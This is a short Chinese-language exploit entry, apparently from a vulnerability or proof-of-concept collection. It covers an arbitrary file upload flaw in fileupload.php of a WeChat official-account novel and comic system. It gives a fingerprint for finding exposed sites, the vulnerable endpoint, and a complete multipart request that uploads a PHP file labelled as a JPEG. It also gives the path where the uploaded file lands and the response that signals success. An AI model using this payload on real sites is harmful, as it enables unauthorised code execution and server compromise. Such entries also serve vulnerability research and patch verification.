# 微信公众号小说漫画系统fileupload.php任意文件上传漏洞

微信公众号小说漫画系统fileupload.php ｜ 文件上传 ｜ —
- **指纹**：`body="/Public/home/mhjs/jquery.js"`
- **请求**：`POST /Public/webuploader/0.1.5/server/fileupload.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="file"; filename="info.php"
Content-Type: image/jpeg
<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryj7OlOPiiukkdktZR
上传定位：/Public/webuploader/0.1.5/server/upload/info.php
```
- **响应特征**：200